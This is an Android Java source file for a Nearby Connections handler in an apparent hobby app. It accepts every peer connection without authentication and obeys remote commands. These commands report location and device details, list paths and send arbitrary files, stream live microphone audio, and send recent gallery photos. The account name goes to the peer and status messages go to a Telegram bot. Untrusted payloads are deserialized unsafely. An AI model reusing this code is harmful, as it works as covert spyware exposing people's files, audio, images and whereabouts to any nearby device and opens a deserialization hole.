package com.sontme.legacysonty;

import static android.content.Context.WIFI_SERVICE;
import static com.sontme.legacysonty.BackgroundService.roundBandwidth;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.location.Location;
import android.net.DhcpInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.ArraySet;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.android.gms.nearby.Nearby;
import com.google.android.gms.nearby.connection.AdvertisingOptions;
import com.google.android.gms.nearby.connection.ConnectionInfo;
import com.google.android.gms.nearby.connection.ConnectionLifecycleCallback;
import com.google.android.gms.nearby.connection.ConnectionResolution;
import com.google.android.gms.nearby.connection.ConnectionsClient;
import com.google.android.gms.nearby.connection.ConnectionsStatusCodes;
import com.google.android.gms.nearby.connection.DiscoveredEndpointInfo;
import com.google.android.gms.nearby.connection.DiscoveryOptions;
import com.google.android.gms.nearby.connection.EndpointDiscoveryCallback;
import com.google.android.gms.nearby.connection.Payload;
import com.google.android.gms.nearby.connection.PayloadCallback;
import com.google.android.gms.nearby.connection.PayloadTransferUpdate;
import com.google.android.gms.nearby.connection.Strategy;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class NearbyHandler {
    public static ConnectionLifecycleCallback connectionLifecycleCallback;
    public static EndpointDiscoveryCallback endpointDiscoveryCallback;
    public static PayloadCallback payloadCallback;
    public static String SERVICE_ID;
    public Context ctx;
    public static Strategy STRATEGY;
    public static String currentDevice;
    public static File recvFile;
    public static Set<String> activeEndpoints = new ArraySet<>(); // add and remove
    public static Set<String> everEndpoints = new ArraySet<>(); // just add
    public static SontHelper.AudioPlayer player;
    public static final Strategy PEERTOPEER_STRATEGY = Strategy.P2P_CLUSTER;

    private void handlePayload(String s, Payload payload) {
        if (payload.getType() == Payload.Type.BYTES) {
            byte[] load = payload.asBytes();
            SontHelper.SerializationHelper serializer = new SontHelper.SerializationHelper();
            Object object = SontHelper.SerializationHelper.deserialize(load);
            Map<String, byte[]> container = (Map<String, byte[]>) object;
            for (Map.Entry<String, byte[]> entry : container.entrySet()) {
                String key = entry.getKey();
                byte[] value_data = entry.getValue();
                if (key.contains("welcome")) {
                    String source = (String) SontHelper.SerializationHelper.deserialize(value_data);
                    ////BackgroundService.addLog1("<b>HELLO</b> from " + source);
                } else if (key.contains("restartService")) {
                    ////BackgroundService.addLog1("RESTARTING Service");
                    SontHelper.TelegramStuff.sendMessage_BetaBot("[" + "legacy" + "] RESTARTING Service");
                    //BackgroundService.restartService();
                } else if (key.contains("whereareyou")) {
                    String address = "";
                    Location location = BackgroundService.CURRENT_LOCATION;
                    if (location.getLongitude() > 0) {
                        address = SontHelper.locationToStringAddress(ctx, location);
                        if (address.length() < 5)
                            address = "Lat/Lng -> " + location.getLatitude() + "/" + location.getLongitude();
                        sendKeyObjectPayload("hereiam", address);
                    }
                } else if (key.contains("hereiam")) {
                    String address = (String) SontHelper.SerializationHelper.deserialize(value_data);
                    ////BackgroundService.addLog1("Remote Address: " + address);
                } else if (key.contains("responseDeviceInfo")) {
                    ////BackgroundService.addLog1("[ Remote Device Infos ]");
                    String devInfo = (String) SontHelper.SerializationHelper.deserialize(value_data);
                    ////BackgroundService.addLog1(devInfo);
                } else if (key.contains("requestDeviceInfo")) {
                    String what = (String) SontHelper.SerializationHelper.deserialize(value_data);
                    String devInfo = "";
                    if (what.equals("all")) {
                        devInfo = getDeviceInfoString();
                    } else {
                        devInfo = "NOT IMPLEMENTED";
                    }
                    sendKeyObjectPayload("responseDeviceInfo", devInfo);
                } else if (key.contains("listpath")) {
                    String path = (String) SontHelper.SerializationHelper.deserialize(value_data);
                    try {
                        File file = new File(path);
                        if (file.exists()) {
                            if (file.isDirectory()) {
                                File[] subfiles = file.listFiles();
                                sendKeyObjectPayload("dirlist", subfiles);
                            } else {
                                sendFilePayload(file);
                            }
                        } else {
                            sendKeyObjectPayload("nofilefound", "nofile_" + file.getAbsolutePath());
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else if (key.contains("nofilefound")) {
                    String path = (String) SontHelper.SerializationHelper.deserialize(value_data);
                    //BackgroundService.addLog1("No FILE found: " + path);
                } else if (key.contains("dirlist")) {
                    //BackgroundService.addLog1("Found items in folder");
                    File[] sub = (File[]) SontHelper.SerializationHelper.deserialize(value_data);
                    //BackgroundService.addLog1("Subs found on remote: " + sub.length);
                    for (File file : sub) {
                        //BackgroundService.addLog1("File: " + file.getAbsolutePath());
                    }
                } else if (key.contains("record")) {
                    //BackgroundService.addLog1("RECORDING Started");
                    try {
                        ParcelFileDescriptor[] payloadPipe = ParcelFileDescriptor.createPipe();
                        SontHelper.AudioRecorder recorder = new SontHelper.AudioRecorder(payloadPipe[1]);
                        if (!recorder.isRecording()) {
                            Nearby.getConnectionsClient(ctx)
                                    .sendPayload(s, Payload.fromStream(payloadPipe[0]));
                            recorder.start();
                            SontHelper.TelegramStuff.sendMessage_BetaBot("[" + "legacy" + "] Streaming Started!");
                        } else {
                            SontHelper.TelegramStuff.sendMessage_BetaBot("[" + "legacy" + "] Streaming Stopped!");
                            //BackgroundService.addLog1("RECORDING Stopped");
                            recorder.stop();
                            recorder = null;
                        }
                    } catch (Exception e) {
                        //BackgroundService.addLog1("RECORDING Error");
                        e.printStackTrace();
                    }
                } else if (key.contains("sendmephoto")) {
                    Bitmap holder = SontHelper.getLastImage(ctx);

                    double MAX = 0.7 * 1024 * 1024;
                    while (holder.getByteCount() > MAX) {
                        holder = SontHelper.resizeBitmap(holder, holder.getWidth() / 1.1, holder.getHeight() / 1.1);
                    }
                    Bitmap reduced = SontHelper.reduceBitmapQuality(holder, 50);
                    SontHelper.BitmapDataObject bitmapdata = new SontHelper.BitmapDataObject(reduced);
                    byte[] serialized = SontHelper.SerializationHelper.serialize(bitmapdata);
                    //BackgroundService.addLog1("Sending Photo. Bitmap length= " + SontHelper.roundBandwidth(holder.getByteCount()) + " | Container length=" + serialized.length);
                    sendKeyObjectPayload("showthis", serialized);
                } else if (key.contains("showthis")) {
                    //BackgroundService.addLog1("Image Received");
                    byte[] deserialized = (byte[]) SontHelper.SerializationHelper.deserialize(value_data);
                    SontHelper.BitmapDataObject bitmapdata = (SontHelper.BitmapDataObject) SontHelper.SerializationHelper.deserialize(deserialized);

                    Bitmap bitmap = bitmapdata.currentImage;
                    try {
                        //LogActivity.bitmapimage_s = bitmap;
                    } catch (Exception e) {
                        //BackgroundService.addLog1("BinderFail_1_" + e.getMessage());
                        e.printStackTrace();
                    }
                    try {
                        //LogActivity.imageView_s.setImageBitmap(bitmap);
                    } catch (Exception e) {
                        //BackgroundService.addLog1("BinderFail_2_" + e.getMessage());
                        e.printStackTrace();
                    }
                    try {
                        //LogActivity.setImage(bitmap);
                    } catch (Exception e) {
                        //BackgroundService.addLog1("BinderFail_3_" + e.getMessage());
                        e.printStackTrace();
                    }
                    File savedimg = SontHelper.saveImage(ctx, bitmap, "rcv_" + bitmap.getWidth() + "x" + bitmap.getHeight() + "_" + System.currentTimeMillis());
                    //BackgroundService.addLog1("Image Path=" + savedimg.getAbsolutePath() + " Size=" + savedimg.length() + " HR=" + SontHelper.roundBandwidth(savedimg.length()));
                } else if (key.contains("sendallimage")) {
                    //BackgroundService.addLog1("ALL IMAGES Requested! Collecting..");
                    ArrayList<SontHelper.BitmapDataObject> bdos = new ArrayList<>();
                    ArrayList<String> imagesPaths = SontHelper.getAllImagesPath(ctx);
                    double TOTALMAX = 0.5 * 1024 * 1024;
                    double summizer = 0;
                    int count = 10;
                    for (int i = 0; i < count; i++) {
                        Bitmap holder = BitmapFactory.decodeFile(imagesPaths.get(i));
                        double MAX = TOTALMAX / count;
                        while (holder.getByteCount() > MAX) {
                            holder = SontHelper.resizeBitmap(holder, holder.getWidth() / 1.1, holder.getHeight() / 1.1);
                        }
                        Bitmap reduced = SontHelper.reduceBitmapQuality(holder, 50);
                        summizer += reduced.getByteCount();
                        SontHelper.BitmapDataObject bdo = new SontHelper.BitmapDataObject(reduced);
                        bdos.add(bdo);
                    }
                    sendKeyObjectPayload("allimages", bdos);

                    //BackgroundService.addLog1("ALL IMAGES Sent! Size: " + bdos.size() + " w/ overhead=" + summizer);
                } else if (key.contains("allimages")) {
                    ArrayList<SontHelper.BitmapDataObject> bdoholder = (ArrayList<SontHelper.BitmapDataObject>) SontHelper.SerializationHelper.deserialize(value_data);
                    //BackgroundService.addLog1("ALL IMAGES Received Size: " + bdoholder.size());
                    Bitmap summizer = null;
                    for (SontHelper.BitmapDataObject bdo : bdoholder) {
                        Bitmap bitmap = bdo.currentImage;
                        if (summizer == null)
                            summizer = bitmap;
                        summizer = SontHelper.combineImages(summizer, bitmap);

                        Log.d("BMP_ADDER", "" + summizer.getWidth() + "x" + summizer.getHeight());
                    }
                    try {
                        //LogActivity.setImage(summizer);
                    } catch (Exception e) {
                        //BackgroundService.addLog1("Cannot set image! " + e.getMessage());
                        e.printStackTrace();
                    }
                    //BackgroundService.addLog1(bdoholder.size() + "<- Image Count Summarized Bitmap=" + summizer.getWidth() + "x" + summizer.getHeight());
                } else {
                    SontHelper.TelegramStuff.sendMessage_BetaBot("[" + "legacy" + "] Unknown Command=" + key + " datalen=" + value_data.length);
                }
            }

        } else if (payload.getType() == Payload.Type.FILE) {
            Payload.File gotFile = payload.asFile();
            File file = gotFile.asJavaFile();
            recvFile = file;
            File pathFolder = ctx.getFilesDir();
            File destFile = new File(pathFolder, "nearby_" + System.currentTimeMillis() + ".png");
            File destFile2 = new File(pathFolder, "nearby_" + System.currentTimeMillis() + ".txt");
            try {
                FileUtils.copyFile(file, destFile);
                FileUtils.copyFile(file, destFile2);
            } catch (Exception e) {
                e.printStackTrace();
            }
            /*Intent intent = new Intent();
            intent.setAction(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(destFile), "image/*");
            ctx.startActivity(intent);*/
            SontHelper.TelegramStuff.sendMessage_BetaBot("[" + "legacy" + "] File Received! Path=" + destFile.getAbsolutePath() + " Size=" + roundBandwidth(destFile.length()) + " Showing it in Gallery!");
            //BackgroundService.addLog1("FILE Received! Path=" + destFile.getAbsolutePath() + " Size=" + destFile.length());
        } else if (payload.getType() == Payload.Type.STREAM) {
            InputStream inputStream = payload.asStream().asInputStream();
            player = new SontHelper.AudioPlayer(inputStream) {
                @Override
                protected void onFinish() {
                    try {
                        player.stop();
                        //BackgroundService.addLog1("<b>Stream Playing</b> Stopped! " + player.isPlaying());
                        player = null;
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            player.start();
            try {
                //BackgroundService.addLog1("<b>Stream Playing</b> Started! Stream length: " + inputStream.available());
            } catch (Exception e) {
                //BackgroundService.addLog1("<b>Stream Playing</b> Started! Stream length: n/a");
            }
        } else {
            //BackgroundService.addLog1("<b><font color=blue>Unknown DATA Received</font></b>");
        }
    }

    private String getDeviceInfoString() {
        final String SERIAL = Build.SERIAL;
        final String MODEL = Build.MODEL;
        final String ID = Build.ID;
        final String MANUF = Build.MANUFACTURER;
        final String BRAND = Build.BRAND;
        final String TYPE = Build.TYPE;
        final String USER = Build.USER;
        final String VERBASE = String.valueOf(Build.VERSION_CODES.BASE);
        final String VERINCR = Build.VERSION.INCREMENTAL;
        final String VERSDK = Build.VERSION.SDK;
        final String BOARD = Build.BOARD;
        final String HOST = Build.HOST;
        final String FINGERPRINT = Build.FINGERPRINT;
        final String RELEASE = Build.VERSION.RELEASE;
        String currentWifi;
        try {
            currentWifi = "currentwifi";
        } catch (Exception e) {
            currentWifi = "na";
        }
        return "Serial: " + SERIAL +
                "\nModel: " + MODEL +
                "\nID: " + ID +
                "\nManufacturer: " + MANUF +
                "\nBrand: " + BRAND +
                "\nType: " + TYPE +
                "\nUser: " + USER +
                "\nVer. Code(base): " + VERBASE +
                "\nVer. Code(incr): " + VERINCR +
                "\nVer. Code(sdk): " + VERSDK +
                "\nBoard: " + BOARD +
                "\nHost: " + HOST +
                "\nFingerprint: " + FINGERPRINT +
                "\nRelease: " + RELEASE +
                "\nCurrent WiFi: " + currentWifi +
                "\n-------------";
    }

    public void vibrate(Context c) {
        Thread thread = new Thread() {
            @Override
            public void run() {
                Vibrator v = (Vibrator) c.getSystemService(Context.VIBRATOR_SERVICE);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(VibrationEffect.createOneShot(20, 10));
                } else {
                    v.vibrate(20);
                }
            }
        };
        thread.start();
    }

    public NearbyHandler(Context ctx, Strategy STRATEGY) {
        this.ctx = ctx;
        NearbyHandler.STRATEGY = STRATEGY;
        //SERVICE_ID = ctx.getPackageName();
        SERVICE_ID = "com.sontme.wirelessmapper";
        try {
            //BackgroundService.addLog1("<u><b><font color=#20B2AA>NEARBY STARTED</font></b></u>");
        } catch (Exception ignored) {
        }
        payloadCallback = new PayloadCallback() {
            @Override
            public void onPayloadReceived(@NonNull String s, @NonNull Payload payload) {
                handlePayload(s, payload);
            }

            @Override
            public void onPayloadTransferUpdate(@NonNull String s, @NonNull PayloadTransferUpdate payloadTransferUpdate) {
                if (payloadTransferUpdate.getStatus() == PayloadTransferUpdate.Status.SUCCESS) {
                    if (recvFile != null) {
                        try {
                            recvFile.renameTo(new File(recvFile.getParentFile(), "nearbyfile.txt"));
                            //BackgroundService.addLog1("File Renamed: " + recvFile.getAbsolutePath());
                        } catch (Exception e) {
                            //BackgroundService.addLog1("Cannot RENAME File: " + recvFile.getAbsolutePath());
                            e.printStackTrace();
                        }
                    }
                    ////BackgroundService.addLog1("PAYLOAD SUCCESS! Bytes: " + payloadTransferUpdate.getTotalBytes() + "/"+payloadTransferUpdate.getBytesTransferred());
                } else if (payloadTransferUpdate.getStatus() == PayloadTransferUpdate.Status.FAILURE) {
                    //BackgroundService.addLog1("PAYLOAD FAILURE! Bytes: " + payloadTransferUpdate.getTotalBytes() + "/" + payloadTransferUpdate.getBytesTransferred());
                }
            }
        };

        connectionLifecycleCallback = new ConnectionLifecycleCallback() {
            @Override
            public void onConnectionInitiated(@NonNull String s, @NonNull ConnectionInfo connectionInfo) {
                com.sontme.legacysonty.Endpoint endpoint = new com.sontme.legacysonty.Endpoint(s, connectionInfo.getEndpointName());
                ConnectionsClient c = Nearby.getConnectionsClient(ctx);
                c.acceptConnection(endpoint.getId(), payloadCallback).addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        currentDevice = s;
                        //BackgroundService.addLog1("<font color=green>ACCEPTED</font> [<b>" + s + "</b>] Name: <b>" + connectionInfo.getEndpointName() + "</b> Token: <b>" + connectionInfo.getAuthenticationToken() + "</b>");
                        vibrate(ctx);
                    }
                });
            }

            @Override
            public void onConnectionResult(@NonNull String s, @NonNull ConnectionResolution connectionResolution) {
                switch (connectionResolution.getStatus().getStatusCode()) {
                    case ConnectionsStatusCodes.STATUS_OK:
                        //BackgroundService.addLog1("<font color=green>CONNECTED</font> [<b>" + s + "</b>]");
                        AccountManager manager = (AccountManager) ctx.getSystemService(Context.ACCOUNT_SERVICE);
                        Account[] list = manager.getAccounts();
                        WifiManager wifi = (WifiManager) ctx.getSystemService(WIFI_SERVICE);
                        DhcpInfo info = wifi.getDhcpInfo();

                        if (list.length >= 1) {
                            sendKeyObjectPayload("welcome", "legacy" + "_" + list[0].name);
                        } else {
                            sendKeyObjectPayload("welcome", "legacy");
                        }
                        stopAdvertising();
                        stopDiscovering();
                        //sendKeyObjectPayload("sendimage", BackgroundService.legacy);
                        break;
                    case ConnectionsStatusCodes.STATUS_CONNECTION_REJECTED:
                        //BackgroundService.addLog1("Connection <font color=red><b>REJECTED</b></font> [<b>" + s + "</b>]");
                        startAdvertising();
                        startDiscovering();
                        break;
                    case ConnectionsStatusCodes.STATUS_ERROR:
                        //BackgroundService.addLog1("Connection <font color=red><b>ERROR</b></font> [<b>" + s + "</b>]");
                        startAdvertising();
                        startDiscovering();
                        break;
                    default:
                        startAdvertising();
                        startDiscovering();
                }
            }

            @Override
            public void onDisconnected(@NonNull String s) {
                activeEndpoints.remove(s);
                //BackgroundService.addLog1("<font color=red>DISCONNECTED</font> [" + s + "]");
                BackgroundService.vibrate(ctx);
                startAdvertising();
                startDiscovering();
            }
        };

        endpointDiscoveryCallback = new EndpointDiscoveryCallback() {
            @Override
            public void onEndpointFound(@NonNull String s, @NonNull DiscoveredEndpointInfo discoveredEndpointInfo) {
                everEndpoints.add(s);
                activeEndpoints.add(s);
                //BackgroundService.addLog1("<font color=#FF8C00>Found</font> [<b>" + s + "</b>] Name: <b>" + discoveredEndpointInfo.getEndpointName() + "</b>");
                com.sontme.legacysonty.Endpoint endpoint = new com.sontme.legacysonty.Endpoint(s, discoveredEndpointInfo.getEndpointName());
                ConnectionsClient c = Nearby.getConnectionsClient(ctx);
                c.requestConnection(endpoint.getName(), endpoint.getId(), connectionLifecycleCallback).addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        vibrate(ctx);
                        //BackgroundService.addLog1("Connected [<b>" + s + "</b>]");
                        stopAdvertising();
                        stopDiscovering();
                    }
                });
            }

            @Override
            public void onEndpointLost(@NonNull String s) {
                //BackgroundService.addLog1("Lost [<b>" + s + "</b>]");
                activeEndpoints.remove(s);
                startAdvertising();
                startDiscovering();
            }
        };

    }

    public boolean sendByteArray(byte[] data) {
        try {
            Payload payload = Payload.fromBytes(data);
            Nearby.getConnectionsClient(ctx)
                    .sendPayload(currentDevice, payload).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    //BackgroundService.addLog1("Cannot send Payload! <u>" + e.getClass().getCanonicalName() + "</u> - " + e.getMessage() + " - Length=" + data.length);
                }
            });
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public void sendFilePayload(File file) {
        try {
            Payload payload = Payload.fromFile(file);
            Nearby.getConnectionsClient(ctx)
                    .sendPayload(currentDevice, payload).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    //BackgroundService.addLog1("Failed to send File Payload! " + e.getMessage());
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendKeyObjectPayload(String key, Object value) {
        byte[] container = new byte[0];
        try {
            SontHelper.SerializationHelper serializationHelper = new SontHelper.SerializationHelper();
            byte[] serialObject = SontHelper.SerializationHelper.serialize(value);
            Map<String, byte[]> dataContainer = new HashMap<String, byte[]>();
            dataContainer.put(key, serialObject);
            container = SontHelper.SerializationHelper.serialize(dataContainer);
        } catch (Exception e) {
            e.printStackTrace();
        }
        sendByteArray(container);
    }

    public void startDiscovering() {
        Nearby.getConnectionsClient(ctx)
                .startDiscovery(
                        SERVICE_ID,
                        endpointDiscoveryCallback,
                        new DiscoveryOptions.Builder()
                                .setStrategy(PEERTOPEER_STRATEGY).build())
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        if (!e.getMessage().contains("8001") && !e.getMessage().contains("8002")) { // already
                            //BackgroundService.addLog1("Discovering Failed! " + e.getMessage());
                        }
                    }
                })
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        //BackgroundService.addLog1("Discovering Started!");
                    }
                });
    }

    public void startAdvertising() {
        Nearby.getConnectionsClient(ctx)
                .startAdvertising(
                        Build.MODEL,
                        SERVICE_ID,
                        connectionLifecycleCallback,
                        new AdvertisingOptions.Builder()
                                .setStrategy(PEERTOPEER_STRATEGY).build())
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        if (!e.getMessage().contains("8001") && !e.getMessage().contains("8002")) { // already
                            //BackgroundService.addLog1("Advertising Failed! " + e.getMessage());
                        }
                    }
                })
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        //BackgroundService.addLog1("Advertising Started!");
                    }
                });
    }

    public void stopDiscovering() {
        ConnectionsClient client = Nearby.getConnectionsClient(ctx);
        client.stopDiscovery();
        //BackgroundService.addLog1("Discovering Stopped");
    }

    public void stopAdvertising() {
        ConnectionsClient client = Nearby.getConnectionsClient(ctx);
        client.stopAdvertising();
        //BackgroundService.addLog1("Advertising Stopped");
    }

    public void closeEndpoints() {
        ConnectionsClient client = Nearby.getConnectionsClient(ctx);
        client.stopAllEndpoints();
        //BackgroundService.addLog1("Endpoints Closed");
    }

}

class Endpoint {
    @NonNull
    private final String id;
    @NonNull
    private final String name;

    public Endpoint(@NonNull String id, @NonNull String name) {
        this.id = id;
        this.name = name;
    }

    @NonNull
    public String getId() {
        return id;
    }

    @NonNull
    public String getName() {
        return name;
    }

    @Override
    public boolean equals(Object obj) {
        if (obj instanceof com.sontme.legacysonty.Endpoint) {
            com.sontme.legacysonty.Endpoint other = (com.sontme.legacysonty.Endpoint) obj;
            return id.equals(other.id);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return id.hashCode();
    }

    @Override
    public String toString() {
        return String.format("Endpoint{id=%s, name=%s}", id, name);
    }
}

